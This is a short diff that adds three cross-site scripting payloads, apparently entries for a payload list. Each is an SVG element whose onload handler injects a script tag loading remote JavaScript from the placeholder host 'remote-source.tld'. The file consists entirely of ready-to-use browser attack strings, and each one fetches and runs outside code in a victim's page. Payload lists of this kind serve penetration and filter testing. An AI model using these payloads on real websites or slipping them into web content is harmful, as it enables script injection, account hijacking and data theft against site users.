@@ -1,0 +1,5 @@
+<svg/onload="with(document)body.appendChild(createElement`script`).src='https://remote-source.tld'"/>
+
+<svg/onload=body.appendChild(document.createElement`script`).src='https://remote-source.tld'/>
+
+<svg/onload=document.getElementsByTagName('head')[0].appendChild(document.createElement`script`).src='https://remote-source.tld'/>
